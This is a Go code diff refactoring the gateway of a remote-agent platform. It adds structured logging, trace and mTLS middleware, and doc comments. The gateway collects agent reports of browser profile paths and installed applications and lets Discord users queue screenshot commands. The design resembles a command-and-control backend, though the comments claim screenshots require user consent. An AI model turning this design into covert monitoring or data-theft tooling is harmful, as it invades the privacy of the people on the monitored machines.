@@ -5,7 +5,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"fmt"
-	"log"
+	"log/slog"
 	"net/http"
 	"os"
 	"strings"
@@ -20,9 +20,13 @@ import (
 	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/command"
 	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/identity"
 	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/provider"
+	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/sdk"
 	pb "github.com/codevault-llc/xenomorph/platform/shared/proto/gen/go/platform/v1"
 )
 
+// Server owns the HTTP transport layer for the gateway. It handles mTLS
+// termination, agent identity extraction, request routing, and event
+// publishing to the NATS broker.
 type Server struct {
 	broker         *broker.NATS
 	notifier       *provider.Fanout
@@ -35,10 +39,15 @@ type Server struct {
 	seenAgents map[string]struct{}
 }
 
+// agentStatusProvider is the interface the Server requires for agent presence
+// queries. The activity.Monitor implements this interface.
 type agentStatusProvider interface {
 	Snapshot(agentID string) (provider.AgentSnapshot, bool)
 }
 
+// NewServer constructs a Server with the given dependencies. All parameters
+// are required except notifier (defaults to no-op Fanout) and discordPoster
+// (nil is valid when Discord is not configured).
 func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.Queue, discordPoster provider.DiscordPoster, statusProvider agentStatusProvider) *Server {
 	if notifier == nil {
 		notifier = provider.NewFanout(nil)
@@ -57,25 +66,21 @@ func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.
 	return s
 }
 
+// routes registers all HTTP middleware and endpoints on the Gin engine.
+//
+// Middleware execution order:
+//  1. traceMiddleware — injects trace_id from X-Trace-ID header or generates one.
+//  2. mtlsMiddleware — authenticates the client via mTLS peer certificate.
+//
+// Endpoints:
+//
+//	POST /ingest/heartbeat   — accepts agent heartbeat payloads.
+//	POST /ingest/entry       — accepts stage-2 onboarding reports.
+//	GET  /commands/next      — dequeues the next pending command for an agent.
+//	POST /commands/result    — accepts command execution results.
 func (s *Server) routes() {
-	s.engine.Use(func(c *gin.Context) {
-		if c.Request.TLS != nil && len(c.Request.TLS.PeerCertificates) > 0 {
-			cert := c.Request.TLS.PeerCertificates[0]
-			authenticatedAgent, err := identity.FromPeerCertificate(cert)
-			if err != nil {
-				c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "invalid client certificate identity"})
-				return
-			}
-
-			c.Set("agent_id", authenticatedAgent.ID)
-			c.Set("agent_cert_fingerprint_sha256", authenticatedAgent.FingerprintSHA256)
-			c.Set("agent_subject_cn", authenticatedAgent.SubjectCommonName)
-		} else {
-			c.AbortWithStatusJSON(403, gin.H{"error": "mTLS required"})
-			return
-		}
-		c.Next()
-	})
+	s.engine.Use(s.traceMiddleware)
+	s.engine.Use(s.mtlsMiddleware)
 
 	s.engine.POST("/ingest/heartbeat", s.handleHeartbeat)
 	s.engine.POST("/ingest/entry", s.handleEntry)
@@ -83,6 +88,65 @@ func (s *Server) routes() {
 	s.engine.POST("/commands/result", s.handleCommandResult)
 }
 
+// traceMiddleware extracts the X-Trace-ID header from the incoming request
+// and stores it in both the Gin context and the request context. When the
+// header is absent, a new UUID is generated.
+//
+// The trace ID is set on the response header and automatically injected into
+// all log records produced by the slog context handler.
+func (s *Server) traceMiddleware(c *gin.Context) {
+	traceID := c.GetHeader("X-Trace-ID")
+	if traceID == "" {
+		traceID = uuid.New().String()
+	}
+	c.Set("trace_id", traceID)
+	c.Header("X-Trace-ID", traceID)
+	c.Request = c.Request.WithContext(sdk.WithTraceID(c.Request.Context(), traceID))
+	c.Next()
+}
+
+// mtlsMiddleware authenticates every request using the mTLS peer certificate.
+// The agent identity is derived deterministically from the certificate
+// fingerprint and stored in the Gin context for downstream handlers.
+//
+// The middleware aborts with HTTP 403 when:
+//   - The TLS connection has no peer certificates (plain HTTP or no client cert).
+//   - The peer certificate cannot be parsed into a valid agent identity.
+//
+// Downstream handlers access the authenticated identity through Gin context
+// keys: "agent_id", "agent_cert_fingerprint_sha256", "agent_subject_cn".
+func (s *Server) mtlsMiddleware(c *gin.Context) {
+	if c.Request.TLS != nil && len(c.Request.TLS.PeerCertificates) > 0 {
+		cert := c.Request.TLS.PeerCertificates[0]
+		authenticatedAgent, err := identity.FromPeerCertificate(cert)
+		if err != nil {
+			slog.ErrorContext(c.Request.Context(), "invalid client certificate identity",
+				"error", err,
+			)
+			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "invalid client certificate identity"})
+			return
+		}
+
+		c.Set("agent_id", authenticatedAgent.ID)
+		c.Set("agent_cert_fingerprint_sha256", authenticatedAgent.FingerprintSHA256)
+		c.Set("agent_subject_cn", authenticatedAgent.SubjectCommonName)
+	} else {
+		c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "mTLS required"})
+		return
+	}
+	c.Next()
+}
+
+// handleHeartbeat processes an authenticated heartbeat submission.
+//
+// The agent identity is extracted from the mTLS peer certificate (set by
+// mtlsMiddleware). No client-supplied identity fields in the request body
+// are trusted. The heartbeat is wrapped in a server-authored EventEnvelope
+// with the authenticated agent ID and published to NATS on subject
+// "sys.in.default.<agentID>.heartbeat".
+//
+// Expected request body: proto.Heartbeat JSON representation.
+// Response: 202 Accepted with event_id and is_new_agent flags.
 func (s *Server) handleHeartbeat(c *gin.Context) {
 	agentID := c.GetString("agent_id")
 	if agentID == "" {
@@ -92,46 +156,50 @@ func (s *Server) handleHeartbeat(c *gin.Context) {
 
 	var hb pb.Heartbeat
 	if err := c.ShouldBindJSON(&hb); err != nil {
-		c.JSON(400, gin.H{"error": "Invalid schema"})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
 		return
 	}
 
-	// Construct Trusted Envelope
 	env := &pb.EventEnvelope{
 		EventId:   uuid.New().String(),
-		TraceId:   c.GetHeader("X-Trace-ID"), // Or generate new
+		TraceId:   c.GetHeader("X-Trace-ID"),
 		Timestamp: timestamppb.Now(),
 		Security: &pb.SecurityContext{
 			AgentId:         agentID,
-			SessionId:       uuid.New().String(), // In real app, cache this
+			SessionId:       uuid.New().String(),
 			ClientIp:        c.ClientIP(),
 			IsAuthenticated: true,
 		},
 		Payload: &pb.EventEnvelope_Heartbeat{Heartbeat: &hb},
 	}
 
-	// Publish to NATS: sys.in.us-east.agent-555.heartbeat
 	subject := "sys.in.default." + agentID + ".heartbeat"
 	if err := s.broker.Publish(subject, env); err != nil {
-		c.JSON(500, gin.H{"error": "Failed to queue event"})
+		slog.ErrorContext(c.Request.Context(), "heartbeat publish failed",
+			"agent_id", agentID,
+			"error", err,
+		)
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
 		return
 	}
 
 	_, existed := s.markSeen(agentID)
 
-	c.JSON(202, gin.H{
+	c.JSON(http.StatusAccepted, gin.H{
 		"status":       "accepted",
 		"event_id":     env.EventId,
 		"is_new_agent": !existed,
 	})
 }
 
+// entryBrowser is the JSON shape for a browser entry in the onboarding report.
 type entryBrowser struct {
 	Name       string `json:"name"`
 	BinaryPath string `json:"binary_path"`
 	ProfileDir string `json:"profile_dir"`
 }
 
+// entryRequest is the JSON shape for the stage-2 onboarding submission.
 type entryRequest struct {
 	Hostname              string         `json:"hostname" binding:"required"`
 	OSVersion             string         `json:"os_version"`
@@ -140,6 +208,15 @@ type entryRequest struct {
 	InstalledApplications []string       `json:"installed_applications"`
 }
 
+// handleEntry processes an authenticated stage-2 onboarding report.
+//
+// The agent identity is extracted from the mTLS session. The request body
+// is validated and normalized through normalizeEntryRequest, which applies
+// length limits to every text field. The normalized report is published to
+// NATS and forwarded to notification providers that implement EntryReporter.
+//
+// Expected request body: entryRequest JSON.
+// Response: 202 Accepted with event_id.
 func (s *Server) handleEntry(c *gin.Context) {
 	agentID := c.GetString("agent_id")
 	if agentID == "" {
@@ -180,17 +257,26 @@ func (s *Server) handleEntry(c *gin.Context) {
 
 	subject := "sys.in.default." + agentID + ".entry"
 	if err := s.broker.Publish(subject, env); err != nil {
+		slog.ErrorContext(c.Request.Context(), "entry publish failed",
+			"agent_id", agentID,
+			"error", err,
+		)
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
 		return
 	}
 
 	if err := s.notifier.ReportEntry(c.Request.Context(), report); err != nil {
-		log.Printf("⚠️ entry notification failed agent=%s: %v", agentID, err)
+		slog.ErrorContext(c.Request.Context(), "entry notification delivery failed",
+			"agent_id", agentID,
+			"error", err,
+		)
 	}
 
 	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
 }
 
+// handleNextCommand dequeues the next pending command for the authenticated
+// agent. Returns 204 No Content when the queue is empty.
 func (s *Server) handleNextCommand(c *gin.Context) {
 	agentID := c.GetString("agent_id")
 	if agentID == "" {
@@ -212,6 +298,7 @@ func (s *Server) handleNextCommand(c *gin.Context) {
 	c.JSON(http.StatusOK, cmd)
 }
 
+// commandResultRequest is the JSON shape for a command execution result.
 type commandResultRequest struct {
 	CommandID      string `json:"command_id" binding:"required"`
 	Type           string `json:"type" binding:"required"`
@@ -223,6 +310,11 @@ type commandResultRequest struct {
 	OutputData     []byte `json:"output_data,omitempty"`
 }
 
+// handleCommandResult processes an authenticated command execution result.
+//
+// The result is published as an audit log entry to NATS. When the result
+// includes screenshot output data and a Discord poster is configured, the
+// screenshot is forwarded to the agent's Discord commands channel.
 func (s *Server) handleCommandResult(c *gin.Context) {
 	agentID := c.GetString("agent_id")
 	if agentID == "" {
@@ -267,6 +359,11 @@ func (s *Server) handleCommandResult(c *gin.Context) {
 
 	subject := "sys.in.default." + agentID + ".command.audit"
 	if err := s.broker.Publish(subject, env); err != nil {
+		slog.ErrorContext(c.Request.Context(), "command result publish failed",
+			"agent_id", agentID,
+			"command_id", req.CommandID,
+			"error", err,
+		)
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
 		return
 	}
@@ -278,31 +375,45 @@ func (s *Server) handleCommandResult(c *gin.Context) {
 	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
 }
 
+// forwardScreenshotToDiscord sends a command result screenshot to the agent's
+// Discord commands channel. The function is a no-op when the agent has no
+// mapped Discord commands channel or when the Discord poster is nil.
+//
+// Security: screenshot output data originates from a remote agent and is
+// forwarded as-is. The data is treated as opaque bytes and no content
+// inspection is performed before forwarding to Discord.
 func (s *Server) forwardScreenshotToDiscord(ctx context.Context, agentID string, req commandResultRequest) {
 	channelID, ok := s.discordPoster.CommandsChannelID(agentID)
 	if !ok {
-		log.Printf("⚠️ no discord commands channel found for agent=%s, cannot forward screenshot", agentID)
+		slog.WarnContext(ctx, "no Discord commands channel found for agent; screenshot not forwarded",
+			"agent_id", agentID,
+		)
 		return
 	}
 
 	if req.Status != "executed" {
 		s.discordPoster.SendChannelMessage(ctx, channelID,
-			fmt.Sprintf("❌ Screenshot request **%s** was **%s**: %s", req.CommandID, req.Status, req.Reason))
+			fmt.Sprintf("Screenshot request **%s** was **%s**: %s", req.CommandID, req.Status, req.Reason))
 		return
 	}
 
 	if len(req.OutputData) == 0 {
-		s.discordPoster.SendChannelMessage(ctx, channelID, "❌ Screenshot returned empty data")
+		s.discordPoster.SendChannelMessage(ctx, channelID, "Screenshot returned empty data")
 		return
 	}
 
 	fileName := fmt.Sprintf("screenshot_%s.png", time.Now().UTC().Format("20060102_150405"))
-	caption := fmt.Sprintf("📸 Screenshot captured from **%s** (command: `%s`)", req.ClientHostname, req.CommandID)
+	caption := fmt.Sprintf("Screenshot captured from **%s** (command: `%s`)", req.ClientHostname, req.CommandID)
 	if err := s.discordPoster.SendChannelFile(ctx, channelID, fileName, req.OutputData, caption); err != nil {
-		log.Printf("⚠️ failed to post screenshot to discord for agent=%s: %v", agentID, err)
+		slog.ErrorContext(ctx, "failed to post screenshot to Discord",
+			"agent_id", agentID,
+			"command_id", req.CommandID,
+			"error", err,
+		)
 	}
 }
 
+// helpText is the response sent for the !help and !h Discord commands.
 var helpText = "**Available Commands**\n\n" +
 	"`!help` / `!h`\n" +
 	"Show this help message\n\n" +
@@ -311,6 +422,8 @@ var helpText = "**Available Commands**\n\n" +
 	"`!screenshot` / `!ss`\n" +
 	"Request a screenshot from the agent"
 
+// HandleDiscordCommand routes a parsed Discord !-command to the appropriate
+// handler based on the command name. Unknown commands return a help hint.
 func (s *Server) HandleDiscordCommand(ctx context.Context, agentID, channelID, command string, args []string, userName string) error {
 	if s.discordPoster == nil {
 		return nil
@@ -329,6 +442,9 @@ func (s *Server) HandleDiscordCommand(ctx context.Context, agentID, channelID, c
 	}
 }
 
+// handleDiscordStatus responds with the agent's current online/offline status.
+// The snapshot is sourced from the activity.Monitor via the statusProvider
+// interface. Returns a human-readable message suitable for Discord.
 func (s *Server) handleDiscordStatus(ctx context.Context, agentID, channelID string) error {
 	if s.statusProvider == nil {
 		return s.discordPoster.SendChannelMessage(ctx, channelID, "Status provider not available")
@@ -341,20 +457,21 @@ func (s *Server) handleDiscordStatus(ctx context.Context, agentID, channelID str
 	}
 
 	ts := snapshot.LastSeen.UTC().Format("Mon Jan 02 2006 15:04:05 UTC")
-	statusEmoji := "🟢"
-	statusText := "Online"
+	statusIndicator := "Online"
 	if !snapshot.IsOnline {
-		statusEmoji = "🔴"
-		statusText = "Offline"
+		statusIndicator = "Offline"
 	}
 
 	msg := fmt.Sprintf(
-		"**Agent Status**\n%s **%s**\n**Hostname:** %s\n**Agent ID:** `%s`\n**Last Seen:** %s",
-		statusEmoji, statusText, snapshot.Hostname, agentID, ts,
+		"**Agent Status**\n**%s**\n**Hostname:** %s\n**Agent ID:** `%s`\n**Last Seen:** %s",
+		statusIndicator, snapshot.Hostname, agentID, ts,
 	)
 	return s.discordPoster.SendChannelMessage(ctx, channelID, msg)
 }
 
+// handleDiscordScreenshot enqueues a screenshot request for the agent.
+// The agent receives the command on its next poll cycle and prompts the user
+// for consent before executing.
 func (s *Server) handleDiscordScreenshot(ctx context.Context, agentID, channelID, userName string) error {
 	if s.commandQueue == nil {
 		return s.discordPoster.SendChannelMessage(ctx, channelID, "Command queue not available")
@@ -367,9 +484,12 @@ func (s *Server) handleDiscordScreenshot(ctx context.Context, agentID, channelID
 	})
 
 	return s.discordPoster.SendChannelMessage(ctx, channelID,
-		fmt.Sprintf("📸 Screenshot request queued for agent `%s`. The agent will be prompted for consent on the next poll cycle.", agentID))
+		fmt.Sprintf("Screenshot request queued for agent `%s`. The agent will be prompted for consent on the next poll cycle.", agentID))
 }
 
+// markSeen records that an agent has been observed. Returns whether this is
+// the first observation (inserted) and whether the agent was previously known
+// (existed). Thread-safe.
 func (s *Server) markSeen(agentID string) (inserted bool, existed bool) {
 	s.seenMu.Lock()
 	defer s.seenMu.Unlock()
@@ -383,6 +503,19 @@ func (s *Server) markSeen(agentID string) (inserted bool, existed bool) {
 	return false, true
 }
 
+// normalizeEntryRequest validates and constrains an entry request into a
+// provider.EntryReport. Every client-supplied text field is clamped to a
+// maximum length before entering the event pipeline.
+//
+// Length limits and why:
+//   - Hostname: 120 characters (typical FQDN limit per RFC 1035).
+//   - OSVersion: 120 characters (free-form, but bounded to prevent abuse).
+//   - Browser name: 80 characters.
+//   - BinaryPath: 260 characters (Windows MAX_PATH convention).
+//   - ProfileDir: 260 characters (same convention).
+//   - Application name: 120 characters.
+//   - Maximum browsers: 32 (reasonable upper bound for browser enumeration).
+//   - Maximum applications: 200 (prevents unbounded memory growth).
 func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryReport {
 	const (
 		maxApps     = 200
@@ -432,6 +565,13 @@ func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryRepor
 	}
 }
 
+// clampText truncates the input to the specified byte length after trimming
+// whitespace. Returns an empty string when the trimmed input is empty.
+//
+// This is the final length gate for client-supplied strings entering the
+// event pipeline. Every handler that stores or forwards user-authored text
+// must pass the text through clampText with a limit appropriate for the
+// downstream consumer.
 func clampText(value string, limit int) string {
 	trimmed := strings.TrimSpace(value)
 	if trimmed == "" {
@@ -443,20 +583,32 @@ func clampText(value string, limit int) string {
 	return trimmed[:limit]
 }
 
+// Run starts the HTTPS listener with strict mTLS enforcement. The server
+// loads the CA certificate, server certificate, and server key from certPath.
+//
+// TLS configuration:
+//   - ClientAuth: RequireAndVerifyClientCert (strict mTLS).
+//   - MinVersion: TLS 1.3 (no fallback to older versions).
+//   - ClientCAs: CA pool built from certPath/ca.crt.
+//
+// Certificate files expected in certPath:
+//   - ca.crt — CA certificate for client verification.
+//   - server.crt — server certificate for TLS handshake.
+//   - server.key — server private key.
 func (s *Server) Run(addr, certPath string) error {
-	// Load CA to verify clients
 	caCert, err := os.ReadFile(certPath + "/ca.crt")
 	if err != nil {
 		return fmt.Errorf("read CA certificate: %w", err)
 	}
+
 	caCertPool := x509.NewCertPool()
 	if ok := caCertPool.AppendCertsFromPEM(caCert); !ok {
-		return fmt.Errorf("parse CA certificate: invalid PEM")
+		return fmt.Errorf("parse CA certificate: invalid PEM data")
 	}
 
 	tlsConfig := &tls.Config{
 		ClientCAs:  caCertPool,
-		ClientAuth: tls.RequireAndVerifyClientCert, // STRICT mTLS
+		ClientAuth: tls.RequireAndVerifyClientCert,
 		MinVersion: tls.VersionTLS13,
 	}
 
